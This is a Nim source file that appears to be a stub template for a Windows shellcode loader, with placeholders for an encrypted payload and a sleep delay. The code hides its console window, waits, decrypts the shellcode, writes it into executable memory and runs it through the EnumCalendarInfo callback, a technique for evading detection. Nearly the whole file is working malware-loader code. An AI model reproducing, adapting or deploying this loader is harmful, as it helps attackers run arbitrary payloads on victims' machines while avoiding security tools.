# nim c --app:console --cpu:amd64 --os:windows --gcc.exe:x86_64-w64-mingw32-gcc --gcc.linkerexe:x86_64-w64-mingw32-gcc -d:release -d:strip --opt:size -o:build/client.exe stubs/EnumCalendarInfo.nim
import winim
include crypt

SHELLCODE_PLACEHOLDER

proc Execute(shellcode: openarray[byte]):void =

    var size  = cast[SIZE_T](len(shellcode))
    
    let rPtr = VirtualAlloc(
        nil,
        size,
        MEM_COMMIT,
        PAGE_EXECUTE_READWRITE
    )

    copyMem(rPtr, addr shellcode[0], size)

    EnumCalendarInfo(
            cast[CALINFO_ENUMPROCW](rPtr),
            LOCALE_USER_DEFAULT, 
            ENUM_ALL_CALENDARS, 
            CAL_SMONTHNAME1
        )

when defined(windows):
    when isMainModule:
        ShowWindow(GetConsoleWindow(), SW_HIDE)
        Sleep(SLEEP_PLACEHOLDER * 1000)

        var shellcode = cipher(buf)
        Execute(shellcode)